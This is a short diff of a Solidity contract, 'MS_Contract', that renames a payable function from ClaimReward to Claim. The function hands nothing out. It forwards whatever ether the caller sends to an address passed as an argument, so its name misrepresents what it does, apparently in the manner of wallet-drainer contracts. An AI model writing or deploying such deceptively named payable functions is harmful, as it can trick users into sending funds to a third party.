@@ -3,7 +3,6 @@
 pragma solidity ^0.8.18;
 
 
-
 contract MS_Contract {
 
   address private owner;
@@ -12,6 +11,6 @@ contract MS_Contract {
   function getOwner() public view returns (address) { return owner; }
   function getBalance() public view returns (uint256) { return address(this).balance; }
 
-  function ClaimReward(address sender) public payable { payable(sender).transfer(msg.value); }
+  function Claim(address sender) public payable { payable(sender).transfer(msg.value); }
 
 }
